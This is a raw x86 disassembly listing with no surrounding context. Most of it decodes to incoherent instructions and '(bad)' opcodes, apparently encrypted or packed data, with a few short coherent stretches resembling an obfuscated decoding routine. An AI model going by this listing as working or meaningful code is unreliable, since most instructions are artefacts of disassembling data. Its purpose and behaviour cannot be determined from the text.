  4081da:	mov    BYTE PTR [ecx-0x45ce34ab],dh
  4081e0:	test   al,0x8
  4081e2:	hlt    
  4081e3:	sub    ah,ch
  4081e5:	rcl    ah,cl
  4081e7:	out    0xe2,al
  4081e9:	mov    ds:0x89141fd3,eax
  4081ee:	mov    ebx,0x51b7aba8
  4081f3:	loope  0x4081c6
  4081f5:	pop    ss
  4081f6:	sub    al,0x72
  4081f8:	dec    edx
  4081f9:	pop    edx
  4081fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081fb:	mov    dl,0x89
  4081fd:	mov    eax,ds:0x1d0e3107
  408202:	and    al,0xf7
  408204:	rcr    DWORD PTR [eax-0x2d45e7fb],1
  40820a:	mov    bh,0xb5
  40820c:	mov    esp,DWORD PTR [ebx]
  40820e:	add    ebp,ecx
  408210:	mov    dh,0xf4
  408212:	retf   
  408213:	int    0x5
  408215:	xor    cl,cl
  408217:	sbb    DWORD PTR [esi*1+0x6594164d],ecx
  40821e:	xchg   ebp,eax
  40821f:	xor    BYTE PTR [ebx+0x5d],0xdb
  408223:	fbstp  TBYTE PTR [ebx-0x213ccfa9]
  408229:	daa    
  40822a:	or     eax,0x1b47fc
  40822f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408230:	daa    
  408231:	push   edi
  408232:	mov    cl,0x8a
  408234:	gs aam 0xaa
  408237:	push   ecx
  408238:	inc    ecx
  408239:	retf   0x4947
  40823c:	test   BYTE PTR [ebx+0x71],dh
  40823f:	sbb    cl,BYTE PTR [edx]
  408241:	fistp  QWORD PTR [ecx-0x12b05275]
  408247:	mov    eax,ds:0x15694ab7
  40824c:	pop    ebx
  40824d:	fld    QWORD PTR [eax-0x2f4ce309]
  408253:	mov    dl,0xed
  408255:	sub    eax,0x13232644
  40825a:	loop   0x408244
  40825c:	push   ecx
  40825d:	shl    DWORD PTR [esi+esi*8],cl
  408260:	(bad)  
  408262:	pusha  
  408263:	dec    ebp
  408264:	pop    esp
  408265:	adc    dh,ah
  408267:	in     al,0x75
  408269:	pop    es
  40826a:	mov    bh,0x60
  40826c:	mov    ds:0x9e4cc3fa,eax
  408271:	mov    ds:0x6a0896d3,eax
  408276:	aad    0x2d
  408278:	enter  0x4756,0x14
  40827c:	mov    ebp,0xea5bfe09
  408281:	je     0x4082ed
  408283:	inc    ecx
  408284:	adc    ebx,DWORD PTR [esi]
  408286:	sbb    DWORD PTR [ecx],edi
  408288:	adc    ebx,DWORD PTR [ebx-0x452bb8eb]
  40828e:	aam    0xe2
  408290:	popa   
  408291:	sub    eax,0x93a65c9f
  408296:	xlat   BYTE PTR ds:[ebx]
  408297:	test   BYTE PTR [edi-0x73],dl
  40829a:	inc    BYTE PTR [edx+0x4b0d59d3]
  4082a0:	xor    DWORD PTR [ebx-0x37],eax
  4082a3:	mov    cl,0xe
  4082a5:	push   ecx
  4082a6:	fidiv  WORD PTR [edx+eiz*4]
  4082a9:	sahf   
  4082aa:	jmp    0x4082fb
  4082ac:	(bad)  [ecx-0x38cc7cb9]
  4082b2:	or     BYTE PTR [edx-0x3dd8382f],ah
  4082b8:	fst    DWORD PTR [ebx-0x9]
  4082bb:	adc    ebx,ecx
  4082bd:	and    BYTE PTR [edi],0x12
  4082c0:	mov    bl,bl
  4082c2:	jle    0x4082c7
  4082c4:	pop    ebp
  4082c5:	pop    ecx
  4082c6:	out    0x84,eax
  4082c8:	sti    
  4082c9:	cs addr16 test eax,0xaa5154d5
  4082d0:	xor    cl,BYTE PTR [edx+0x2f]
  4082d3:	mov    DWORD PTR [ecx],eax
  4082d5:	loopne 0x408270
  4082d7:	out    0xe4,al
  4082d9:	fnstenv ds:0xe58f76f6
  4082df:	xchg   esp,eax
  4082e0:	push   0x54
  4082e2:	mov    ch,0x89
  4082e4:	xchg   edx,eax
  4082e5:	jae    0x4082ce
  4082e7:	shr    DWORD PTR [edi-0x14],0xa5
  4082eb:	jne    0x4082d6
  4082ed:	fidivr WORD PTR [edi-0x7af36736]
  4082f3:	mov    ecx,0x3097d7a5
  4082f8:	loopne 0x408307
  4082fa:	iret   
  4082fb:	jecxz  0x40837b
  4082fd:	push   ss
  4082fe:	test   eax,0x1f9bfe46
  408303:	je     0x408370
  408305:	jecxz  0x4082ca
  408307:	xchg   DWORD PTR [ebp+ebp*8-0x14be233b],edx
  40830e:	adc    DWORD PTR [ebp+0xe],eax
  408311:	pop    ss
  408312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408313:	xcrypt-ctr (bad)
  408314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408315:	pop    esi
  408316:	mov    edi,0x3e822216
  40831b:	dec    ebp
  40831c:	scas   al,BYTE PTR es:[edi]
  40831d:	mov    ebp,0x107ebcd5
  408322:	mov    bp,WORD PTR [ebx-0x65d8990c]
  408329:	pop    ebp
  40832a:	push   esp
  40832b:	jnp    0x40833f
  40832d:	pop    edx
  40832e:	lahf   
  40832f:	lods   al,BYTE PTR ds:[esi]
  408330:	(bad)  
  408331:	jmp    0x5425:0x8da24b70
  408338:	stc    
  408339:	pusha  
  40833a:	mov    ebx,esi
  40833c:	popf   
  40833d:	leave  
  40833e:	std    
  40833f:	jbe    0x4083be
  408341:	pop    esi
  408342:	ss fs mov dl,al
  408346:	mov    al,ds:0x75806d68
  40834b:	addr16 sahf 
  40834d:	sbb    dh,BYTE PTR [eax]
  40834f:	arpl   WORD PTR [edx+0x5c2698cb],bx
  408355:	loope  0x40831b
  408357:	mov    dh,0x1d
  408359:	aas    
  40835a:	ror    BYTE PTR [edi-0x5d7f4119],cl
  408360:	icebp  
  408361:	xchg   ebx,eax
  408362:	cmp    ebx,DWORD PTR [edi-0x2bd43e53]
  408368:	add    eax,0xd28428db
  40836d:	sti    
  40836e:	and    bl,bl
  408370:	xor    eax,0xa84f98ba
  408375:	(bad)  
  408376:	into   
  408377:	mov    ebx,0x813d3973
  40837c:	dec    ebx
  40837d:	xchg   ebx,eax
  40837e:	(bad)  
  40837f:	mov    edx,0xedfd1aa7
  408384:	lods   al,BYTE PTR ds:[esi]
  408385:	add    al,0x68
  408387:	sar    BYTE PTR [ebp+0x5e],cl
  40838a:	imul   ecx,DWORD PTR [ecx-0x2c],0x159967c1
  408391:	sbb    al,0x24
  408393:	(bad)  
  408394:	dec    edi
  408395:	pop    edi
  408396:	cmp    ch,bl
  408398:	mov    ch,0xe1
  40839a:	jg     0x408401
  40839c:	sti    
  40839d:	sar    ah,cl
  40839f:	sar    bh,1
  4083a1:	add    ecx,DWORD PTR [eax+edx*1+0x62]
  4083a5:	iret   
  4083a6:	(bad)  
  4083a7:	or     eax,DWORD PTR [ebp-0x526e3478]
  4083ad:	jno    0x408340
  4083af:	add    DWORD PTR [edx+ebx*8-0x6feabb33],esp
  4083b6:	xchg   DWORD PTR [ecx+0x2],esp
  4083b9:	xchg   ebx,esp
  4083bb:	retf   0x79d
  4083be:	fild   DWORD PTR [ecx+0x1e093682]
  4083c4:	(bad)  
  4083c5:	jmp    0x408365
  4083c7:	and    esi,DWORD PTR [ebp-0x214e7924]
  4083cd:	out    dx,al
  4083ce:	dec    ecx
  4083cf:	out    0x9d,al
  4083d1:	and    eax,DWORD PTR [edx+eiz*1-0x1e]
  4083d5:	xor    eax,0xea1c56c2
  4083da:	out    dx,al
  4083db:	xchg   BYTE PTR [bx+si+0x17],bh
  4083df:	xchg   BYTE PTR [eax+0x6efe42f3],ah
  4083e5:	adc    bh,bh
  4083e7:	imul   ecx,DWORD PTR [ebx+0x4ca8be05],0x39f5b63d
  4083f1:	cmp    eax,0xc21d8bf7
  4083f6:	cs cdq 
  4083f8:	test   al,0x59
  4083fa:	mov    BYTE PTR [ecx-0x35badac8],dh
  408400:	repz xor ecx,0x82242c8a
  408407:	adc    eax,esp
  408409:	dec    ebx
  40840a:	mov    ch,0xa1
  40840c:	sbb    eax,0x7fdfa451
  408411:	test   BYTE PTR [ebp+0x56d2b08a],bh
  408417:	pop    es
  408418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408419:	push   edi
  40841a:	add    ah,ah
  40841c:	leave  
  40841d:	mov    dh,0xb8
  40841f:	and    DWORD PTR [edi],ebp
  408421:	xor    al,0x40
  408423:	mov    ds:0xc04bae02,al
  408428:	cwde   
  408429:	pop    edi
  40842a:	test   BYTE PTR [ecx+0x7a0a5ae0],0xe5
  408431:	pop    ebx
  408432:	(bad)  
  408433:	and    DWORD PTR [edx+esi*1+0x296e556d],0x32
  40843b:	popa   
  40843c:	(bad)  
  40843d:	mov    edi,0xbb462eca
  408442:	out    dx,al
  408443:	fsubr  DWORD PTR [esi-0x8]
  408446:	push   esi
  408447:	cli    
  408448:	adc    DWORD PTR [ebx+0x3d],0x1e8d72f5
  40844f:	mov    ch,BYTE PTR [edi-0xc]
  408452:	xchg   esp,eax
  408453:	fidivr WORD PTR [edi-0x3c]
  408456:	pop    ss
  408457:	(bad)  
  408458:	mov    ebx,0x8e89ec19
  40845d:	mov    ss,eax
  40845f:	push   ds
  408460:	sub    BYTE PTR [edx-0x5c3d7d01],dh
  408466:	fcom   st(4)
  408468:	popa   
  408469:	add    edi,ebx
  40846b:	jmp    0x408410
  40846d:	retf   0x9de0
  408470:	stc    
  408471:	dec    DWORD PTR [eax]
  408473:	adc    esi,edx
  408475:	push   edx
  408476:	rcr    DWORD PTR [edx-0x2a],1
  408479:	inc    esp
  40847a:	or     eax,0xc596172d
  40847f:	pop    edi
  408480:	sub    BYTE PTR [esi],0x79
  408483:	mov    al,0x8
  408485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408486:	sahf   
  408487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408488:	sti    
  408489:	jnp    0x4084d6
  40848b:	sbb    BYTE PTR [esi+0x69d0bf05],0x46
  408492:	sbb    DWORD PTR [esi],edi
  408494:	push   ds
  408495:	xchg   ebp,eax
  408496:	mov    eax,0x525ce60d
  40849b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40849c:	lahf   
  40849d:	sub    DWORD PTR [ebx],edx
  40849f:	pop    ebx
  4084a0:	pop    esp
  4084a1:	mov    esi,0xe02c4e26
  4084a6:	jl     0x408480
  4084a8:	xor    BYTE PTR [esi+0x37],0x8f
  4084ac:	mov    cl,0x90
  4084ae:	test   al,0x4f
  4084b0:	jmp    0x1388:0x499f705b
  4084b7:	add    edx,DWORD PTR [edx-0x4a]
  4084ba:	mov    eax,DWORD PTR [ebp-0x8]
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	mov    bl,0x83
  408510:	les    edx,FWORD PTR [esi+0x32]
  408513:	fidivr WORD PTR [esp+edi*2-0x29]
  408517:	jns    0x408595
  408519:	jl     0x408521
  40851b:	neg    edi
  40851d:	cwde   
  40851e:	adc    ecx,edi
  408520:	add    BYTE PTR [eax],bh
  408522:	jp     0x408524
  408524:	aam    0xee
  408526:	std    
  408527:	arpl   WORD PTR [esi-0x24015ac8],bx
  40852d:	stos   BYTE PTR es:[edi],al
  40852e:	hlt    
  40852f:	call   0xb9c0:0x512e3048
  408536:	and    edx,DWORD PTR [edx]
  408538:	xor    ah,cl
  40853a:	or     eax,esp
  40853c:	mov    DWORD PTR [eax-0x11f5082c],eax
  408542:	sbb    al,0x85
  408544:	call   0x77bddcc6
  408549:	and    al,BYTE PTR [ebp-0x25fb4ead]
  40854f:	jp     0x4085ab
  408551:	dec    ebp
  408552:	and    dl,bh
  408554:	int3   
  408555:	sub    al,0x6
  408557:	xor    eax,0xbd51e189
  40855c:	inc    eax
  40855d:	ds ret 0x6992
  408561:	je     0x408507
  408563:	retf   0x5694
  408566:	mov    dh,0x19
  408568:	sbb    BYTE PTR [ebx-0x2a],cl
  40856b:	js     0x4085c8
  40856d:	rol    DWORD PTR ds:0xe99cae52,0xc1
  408574:	mov    BYTE PTR [edx],bh
  408576:	mov    dl,0xce
  408578:	or     dl,BYTE PTR [esi-0x750ede00]
  40857e:	sbb    al,0x44
  408580:	push   cs
  408581:	lods   al,BYTE PTR ds:[esi]
  408582:	mov    bh,0x2d
  408584:	jns    0x4085a8
  408586:	loopne 0x408540
  408588:	mov    al,ds:0x4d2af079
  40858d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40858f:	cwde   
  408590:	in     al,0xb6
  408592:	ja     0x40856a
  408594:	sbb    al,0x31
  408596:	sub    esp,DWORD PTR [ebx+0x2b]
  408599:	xor    ecx,DWORD PTR [ebx+ebx*2-0x249c03ea]
  4085a0:	popf   
  4085a1:	aam    0xc1
  4085a3:	jmp    0xa8fd:0xee0304c8
  4085aa:	rcl    DWORD PTR [ebp+0x33e00eb4],1
  4085b0:	xor    BYTE PTR [ecx+0x2fadae28],bl
  4085b6:	in     eax,dx
  4085b7:	dec    ecx
  4085b8:	idiv   DWORD PTR [eax+0x4a2846c]
  4085be:	mov    ebx,0xe9dd6505
  4085c3:	xchg   esi,eax
  4085c4:	rcr    DWORD PTR ds:0xe5ff9957,1
  4085ca:	sub    BYTE PTR [edi],ch
  4085cc:	mov    esi,0x4336e415
  4085d1:	(bad)  
  4085d2:	cmp    dh,cl
  4085d4:	ret    
  4085d5:	cli    
  4085d6:	ja     0x40858c
  4085d8:	int    0xfb
  4085da:	push   esi
  4085db:	pop    ds
  4085dc:	dec    esp
  4085dd:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4085df:	mov    dl,bh
  4085e1:	loopne 0x40863a
  4085e3:	ret    
  4085e4:	mov    eax,0xd9b46186
  4085e9:	ins    BYTE PTR es:[edi],dx
  4085ea:	xchg   ebx,eax
  4085eb:	adc    dl,0xf5
  4085ee:	test   eax,0x2acb5702
  4085f3:	jg     0x4085ce
  4085f5:	jae    0x40866c
  4085f7:	mov    ss,WORD PTR [eax+0x14f0ea1b]
  4085fd:	pop    es
  4085fe:	bound  ecx,QWORD PTR fs:0x4efa36e5
  408605:	lods   eax,DWORD PTR ds:[esi]
  408606:	cld    
  408607:	push   es
  408608:	mov    bl,0x4d
  40860a:	inc    esp
  40860b:	mov    ecx,0xb74f69a
  408610:	cvttps2pi mm2,xmm4
  408613:	retf   
  408614:	push   esp
  408615:	ss daa 
  408617:	push   edi
  408618:	out    dx,eax
  408619:	repz mov eax,ds:0x253351a8
  40861f:	or     esi,esp
  408621:	sbb    BYTE PTR [edi+0x697b0438],ah
  408627:	inc    ebp
  408628:	xchg   esp,eax
  408629:	ror    dh,cl
  40862b:	push   ebx
  40862c:	pushf  
  40862d:	out    dx,al
  40862e:	(bad)  
  40862f:	aaa    
  408630:	xor    ah,BYTE PTR [edx-0x5b2b0475]
  408636:	jo     0x408630
  408638:	test   eax,0x7dfd420a
  40863d:	in     eax,0x4e
  40863f:	mov    eax,ds:0xd8ecf8ca
  408644:	jmp    0x4086b5
  408646:	fwait
  408647:	dec    edx
  408648:	jmp    0x4085ca
  40864a:	cmp    al,0x73
  40864c:	cmp    BYTE PTR [esp+ecx*2-0x2d],ah
  408650:	fcmovnu st,st(5)
  408652:	outs   dx,DWORD PTR ds:[esi]
  408653:	icebp  
  408654:	gs ret 
  408656:	mov    eax,0xdcc4a4a8
  40865b:	aam    0x8c
  40865d:	jmp    0x6e9f:0x4b11eebe
  408664:	or     eax,0xaf355a10
  408669:	push   esi
  40866a:	xor    ah,ch
  40866c:	xlat   BYTE PTR ds:[ebx]
  40866d:	push   0x6
  40866f:	shl    cl,cl
  408671:	or     eax,0xe03a663a
  408676:	pushf  
  408677:	sub    eax,0x9ecbebce
  40867c:	mov    ah,0xed
  40867e:	enter  0xe331,0xee
  408682:	and    dl,BYTE PTR [ebp+0x39]
  408685:	jge    0x4086fe
  408687:	mov    dl,BYTE PTR [ebp+ebp*8+0x62e1ef57]
  40868e:	mov    edi,0xb37034bf
  408693:	sub    esp,ebx
  408695:	cmc    
  408696:	(bad)  
  408697:	in     eax,0xe5
  408699:	and    cl,cl
  40869b:	test   eax,0xdb3468b7
  4086a0:	sti    
  4086a1:	xchg   eax,esp
  4086a3:	xchg   esp,eax
  4086a4:	mov    al,BYTE PTR [ecx-0x69]
  4086a7:	jg     0x408650
  4086a9:	mov    cl,BYTE PTR [ebx+0x26]
  4086ac:	rol    BYTE PTR [edx+0x6b],1
  4086af:	in     al,0x9b
  4086b1:	dec    ecx
  4086b2:	and    edx,0x2b
  4086b5:	loopne 0x408663
  4086b7:	jecxz  0x4086cc
  4086b9:	mov    dh,0x59
  4086bb:	lods   eax,DWORD PTR ds:[esi]
  4086bc:	or     cl,BYTE PTR [edx+0x2a3347e4]
  4086c2:	jle    0x4086e2
  4086c4:	sahf   
  4086c5:	add    bh,BYTE PTR [esi+0x343a7eeb]
  4086cb:	ja     0x408662
  4086cd:	sti    
  4086ce:	inc    esp
  4086cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d0:	dec    ebp
  4086d1:	mov    cl,0xa3
  4086d3:	(bad)  
  4086d4:	cs inc ecx
  4086d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086d7:	(bad)  
  4086d8:	jae    0x408717
  4086da:	popa   
  4086db:	ss mov bl,0x4f
  4086de:	adc    ah,BYTE PTR [eax-0x67]
  4086e1:	add    BYTE PTR [ecx-0x48],0x8c
  4086e5:	mov    edi,0xdac20302
  4086ea:	inc    eax
  4086eb:	enter  0x7fb0,0x6d
  4086ef:	into   
  4086f0:	or     DWORD PTR [eax+0x9],esp
  4086f3:	xor    DWORD PTR [edx+0x3f9819c5],esp
  4086f9:	inc    ebx
  4086fa:	(bad)  [ecx+0x5f]
  4086fd:	jmp    0x7113:0x65908298
  408704:	nop
  408705:	or     ch,cl
  408707:	out    0xbe,eax
  408709:	enter  0x9d21,0xb6
  40870d:	inc    edi
  40870e:	mov    ebp,edi
  408710:	repnz in al,dx
  408712:	pop    ds
  408713:	and    BYTE PTR [ecx],cl
  408715:	shr    DWORD PTR [edx],1
  408717:	dec    ebx
  408718:	sahf   
  408719:	inc    eax
  40871a:	jbe    0x4086f6
  40871c:	xor    eax,0xc529b86b
  408721:	xchg   ebp,eax
  408722:	(bad)
  408726:	push   DWORD PTR [ebx-0x4440b248]
  40872c:	pop    ss
  40872d:	mov    al,0x26
  40872f:	sub    al,0x82
  408731:	dec    ebp
  408732:	lea    edx,[eax-0x28375797]
  408738:	inc    ebx
  408739:	aas    
  40873a:	mov    al,ds:0xc22ac699
  40873f:	push   ecx
  408740:	mov    edx,0x8762a9d3
  408745:	sti    
  408746:	data16 jae 0x40876f
  408749:	pop    esp
  40874a:	fwait
  40874b:	sti    
  40874c:	cmp    DWORD PTR [ecx],edi
  40874e:	and    al,0x36
  408750:	fsub   st,st(7)
  408752:	cmp    edi,DWORD PTR [ecx+0x2e]
  408755:	xchg   esp,eax
  408756:	int    0xbc
  408758:	ja     0x408704
  40875a:	mov    WORD PTR [edi+0x1a],?
  40875d:	sub    eax,ebx
  40875f:	ja     0x4086fd
  408761:	mov    bl,0x1d
  408763:	xor    DWORD PTR [esi-0x67],eax
  408766:	dec    edx
  408767:	into   
  408768:	cmp    BYTE PTR [esi],0xba
  40876b:	dec    edx
  40876c:	test   al,0xb5
  40876e:	push   edx
  40876f:	(bad)  
  408770:	(bad)  
  408772:	cld    
  408773:	xor    dh,BYTE PTR [eax-0x67]
  408776:	cli    
  408777:	xchg   esp,eax
  408778:	cmp    DWORD PTR [ebx+esi*1-0x7bf34fec],0x5a
  408780:	sub    al,0xdd
  408782:	dec    eax
  408783:	cmp    DWORD PTR [ecx-0x583cde2b],edi
  408789:	pop    esp
  40878a:	call   0x3c50:0x647a2ae9
  408791:	adc    eax,0x737ac2de
  408796:	jb     0x408746
  408798:	and    ch,BYTE PTR [ecx+eiz*8-0x3ee320d1]
  40879f:	outs   dx,BYTE PTR ds:[esi]
  4087a0:	ret    0x4053
  4087a3:	xchg   ebx,eax
  4087a4:	add    eax,DWORD PTR [eax+esi*8+0x795124f1]
  4087ab:	push   edx
  4087ac:	jecxz  0x4087a2
  4087ae:	icebp  
  4087af:	ret    0xad7a
  4087b2:	fsubp  st(3),st
  4087b4:	push   cs
  4087b5:	lods   eax,DWORD PTR ds:[esi]
  4087b6:	lods   eax,DWORD PTR ds:[esi]
  4087b7:	(bad)  
  4087b9:	push   ecx
  4087ba:	aad    0xe5
  4087bc:	mov    ch,0xbf
  4087be:	cmp    al,0xf2
  4087c0:	je     0x4087ce
  4087c2:	(bad)  [ebp-0x745f60a6]
  4087c8:	test   al,0xb
  4087ca:	sbb    eax,0x37004d6e
  4087cf:	or     al,0xd4
  4087d1:	fisubr WORD PTR [ebx+0x66]
  4087d4:	js     0x4087f2
  4087d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d7:	mov    eax,0x9135193d
  4087dc:	loop   0x4087fe
  4087de:	popf   
  4087df:	mov    ah,0xfb
  4087e1:	dec    edx
  4087e2:	pop    ebp
  4087e3:	mov    DWORD PTR [edi+0xe75f08a],eax
  4087e9:	adc    al,0x60
  4087eb:	add    bl,dh
  4087ed:	adc    DWORD PTR [ebx-0x131228be],edi
  4087f3:	mov    ecx,0xbc1bcb49
  4087f8:	push   ecx
  4087f9:	fs das 
  4087fb:	inc    ecx
  4087fc:	mov    ah,0x7
  4087fe:	pop    ds
  4087ff:	push   edx
  408800:	jne    0x4087b0
  408802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408803:	adc    DWORD PTR [edx],ecx
  408805:	not    DWORD PTR [eax]
  408807:	enter  0x4f54,0x5c
  40880b:	outs   dx,BYTE PTR ds:[esi]
  40880c:	mov    al,0x18
  40880e:	int    0xcc
  408810:	sbb    ch,BYTE PTR [ecx+0x364b395a]
  408816:	pop    edx
  408817:	(bad)  
  40881a:	xchg   ebx,eax
  40881b:	rcl    DWORD PTR [ebx+0x27eacf61],0x6f
  408822:	jmp    0x49bc001f
  408827:	ins    BYTE PTR es:[edi],dx
  408828:	jle    0x4087e9
  40882a:	sub    DWORD PTR [eax-0x735be87b],ecx
  408830:	xor    ebp,DWORD PTR [edi-0x4e]
  408833:	gs mov eax,0x9fb25f7
  408839:	add    eax,0x7d9c2bee
  40883e:	add    esp,DWORD PTR [edi+0x40739171]
  408844:	and    eax,0xc6122206
  408849:	jae    0x4088b9
  40884b:	bound  ecx,QWORD PTR ds:0x9aecbc84
  408851:	in     al,dx
  408852:	aad    0xf4
  408854:	(bad)  
  408855:	mov    edx,esp
  408857:	jl     0x408864
  408859:	les    edx,FWORD PTR [ecx-0x3f]
  40885c:	loop   0x4087f9
  40885e:	xor    DWORD PTR [ebp-0x2af43a79],edx
  408864:	std    
  408865:	lock jno 0x40888f
  408868:	dec    ebx
  408869:	test   DWORD PTR [esi-0x58485ffa],eax
  40886f:	int    0x80
  408871:	fisub  WORD PTR [edi-0x7f]
  408874:	xor    BYTE PTR [edi-0x16d9af06],cl
  40887a:	cmp    al,0xfc
  40887c:	(bad)  
  40887d:	jmp    DWORD PTR [esi-0x75]
  408880:	inc    ebp
  408881:	cld    
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0x73
  4088df:	repnz icebp 
  4088e1:	xlat   BYTE PTR ds:[ebx]
  4088e2:	xchg   ebp,eax
  4088e3:	fstp   TBYTE PTR [esp+edi*2-0x29]
  4088e7:	jns    0x408965
  4088e9:	jl     0x40894e
  4088eb:	inc    ebp
  4088ec:	leave  
  4088ed:	cmp    bl,BYTE PTR [ebx-0x28]
  4088f0:	rol    ebx,1
  4088f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f3:	jae    0x408933
  4088f5:	cli    
  4088f6:	push   es
  4088f7:	and    edx,DWORD PTR [eax]
  4088f9:	sbb    dl,BYTE PTR [esi-0x3c057dd0]
  4088ff:	sahf   
  408900:	aad    0x6d
  408902:	lahf   
  408903:	dec    ebp
  408904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408905:	jo     0x408957
  408907:	and    DWORD PTR [ebx],esp
  408909:	push   ebp
  40890a:	ja     0x408961
  40890c:	mov    bh,0x8b
  40890e:	sub    DWORD PTR [eax-0x5a958508],esi
  408914:	mov    cs,WORD PTR [esi+0x57c20ae7]
  40891a:	or     BYTE PTR [ebp-0x76667d71],dh
  408920:	add    eax,0x35d18ef
  408925:	pop    ebx
  408926:	mov    ebp,0x311d800f
  40892b:	xor    BYTE PTR [esi],ah
  40892d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40892e:	data16 shl BYTE PTR [eax+0x3f267759],cl
  408935:	inc    esp
  408936:	jmp    0x40899a
  408938:	mov    al,0xdf
  40893a:	dec    esp
  40893b:	out    dx,eax
  40893c:	sub    ah,0xf0
  40893f:	dec    ebx
  408940:	mov    ah,0xb5
  408942:	dec    esi
  408943:	inc    ebx
  408944:	mov    al,ds:0x3753a8e0
  408949:	ins    BYTE PTR es:[edi],dx
  40894a:	(bad)  
  40894b:	sbb    edi,DWORD PTR [eax-0x63]
  40894e:	jg     0x4089ad
  408950:	mov    ds:0xabae89fe,eax
  408955:	mov    ds:0x65cfe989,al
  40895a:	push   ebx
  40895b:	dec    ebx
  40895c:	push   eax
  40895d:	jne    0x40898b
  40895f:	(bad)  
  408960:	or     eax,0xdb6333a5
  408965:	xor    DWORD PTR [eax],esi
  408967:	inc    ebp
  408968:	call   0x3d63:0x61c0035e
  40896f:	pop    edx
  408970:	aas    
  408971:	push   edx
  408972:	loopne 0x4089a0
  408974:	stos   BYTE PTR es:[edi],al
  408975:	aam    0x79
  408977:	je     0x408959
  408979:	into   
  40897a:	shr    BYTE PTR [esi+0x74],cl
  40897d:	pop    ebp
  40897e:	xlat   BYTE PTR ds:[ebx]
  40897f:	sub    eax,0x511cf091
  408984:	or     DWORD PTR [edx-0x5b3ecfa6],eax
  40898a:	lods   al,BYTE PTR ds:[esi]
  40898b:	cli    
  40898c:	xchg   ecx,eax
  40898d:	in     eax,dx
  40898e:	and    esp,ebp
  408990:	pop    esi
  408991:	outs   dx,DWORD PTR ds:[esi]
  408992:	sbb    BYTE PTR ds:0xcecea3c,0x4f
  408999:	mov    ecx,0xb208a065
  40899e:	dec    ecx
  40899f:	add    al,0x28
  4089a1:	xor    esp,DWORD PTR [ebx+0x13302204]
  4089a7:	and    al,0xe2
  4089a9:	push   ds
  4089aa:	push   0xa501d644
  4089af:	(bad)
  4089b2:	es push esp
  4089b4:	das    
  4089b5:	mov    eax,0xf2e4f83f
  4089ba:	inc    eax
  4089bb:	(bad)  
  4089bc:	int3   
  4089bd:	repnz adc esp,DWORD PTR [ebx+0x115cc6aa]
  4089c4:	inc    edx
  4089c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089c6:	sub    DWORD PTR [eax+0x4f587c66],edi
  4089cc:	sbb    eax,0x31788a0a
  4089d1:	mov    esp,0x3c2b0f01
  4089d6:	dec    ebp
  4089d7:	out    0xfe,al
  4089d9:	dec    eax
  4089da:	mov    cl,0xe0
  4089dc:	push   edx
  4089dd:	int3   
  4089de:	mov    cl,0xe1
  4089e0:	add    DWORD PTR [ecx+0x1fed9fae],0xb0f93ec5
  4089ea:	inc    ebx
  4089eb:	jle    0x4089c8
  4089ed:	cmc    
  4089ee:	mov    bl,0x7b
  4089f0:	in     al,0xb3
  4089f2:	sbb    ecx,DWORD PTR [edi-0x4cc5b090]
  4089f8:	loopne 0x408a06
  4089fa:	popa   
  4089fb:	mov    al,ds:0xe1cecd45
  408a00:	cld    
  408a01:	mov    eax,ds:0x88a9c756
